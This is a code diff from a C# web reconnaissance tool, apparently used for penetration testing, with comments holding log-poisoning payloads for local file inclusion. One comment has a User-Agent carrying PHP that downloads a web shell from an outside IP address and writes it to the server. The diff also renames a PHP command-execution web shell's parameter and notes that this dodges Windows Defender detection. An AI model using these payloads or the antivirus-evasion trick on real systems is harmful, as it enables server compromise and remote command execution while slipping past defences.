@@ -88,7 +88,8 @@ namespace Reecon
                     {
                         // Log poisoning file upload
                         // Mozilla/5.0 <?php file_put_contents('reeshell.php', file_get_contents('http://10.8.8.233:9001/reeshell.php'))?> Firefox/70.0
-                        // Mozilla/5.0 <?php system($_GET['cmd']);?> Firefox/70.0 if no callbacks allowed / you can't find the file
+                        // The below line is virus-flagged by "Rising", "Sangfor Engine Zero", and "Tencent" - But not by Defender (It is if you change woofles to cmd) 
+                        // Mozilla/5.0 <?php system($_GET['woofles']);?> Firefox/70.0 if no callbacks allowed / you can't find the file
                         Console.WriteLine("LFI - Log Poisoning File Upload - Bug Reelix");
                     }
                 }
@@ -182,7 +183,7 @@ namespace Reecon
 
             // Run checks to determine what an invalid path returns
             Console.WriteLine("Determining invalid path results...");
-            
+
             // NFL1 - A regular invalid path
             string result = Web.GetHTTPInfo(baseURL + "Reelix", cookie: cookie).PageText;
             notFoundLength = result.Length; // Check for cases where the page text contains the URL?
